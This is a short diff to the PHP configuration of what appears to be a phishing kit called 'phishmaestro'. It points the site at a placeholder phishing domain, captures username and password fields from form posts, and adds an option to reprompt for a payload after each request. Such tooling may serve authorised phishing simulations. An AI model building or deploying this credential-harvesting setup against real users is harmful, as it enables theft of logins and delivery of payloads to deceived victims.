@@ -1,10 +1,10 @@
 <?php
 
- $webURL = 'https://www.THEDOMAIN.com';
+ $webURL = 'https://www.PHISHINGSITE.com';
  $webDIR = '/var/www/html';
  $pmDIR = "phishmaestro";
 
- $failedLoginURL = "$webURL/login.htm";
+ $failedLoginURL = "$webURL/login.html";
 
  # Phishing Site Parameters
  $loginURL =  $webURL . "/index.html"; 
@@ -17,6 +17,12 @@
  # Parameters from your phishing site
  $user = $_POST['username'];
  $pass = $_POST['password'];
+
+
+ # Functionality Parameters
+
+ #Reprompt for payload after each request
+ $alwaysRedoPayload = true;
 
 
  $sleepTime = "1";
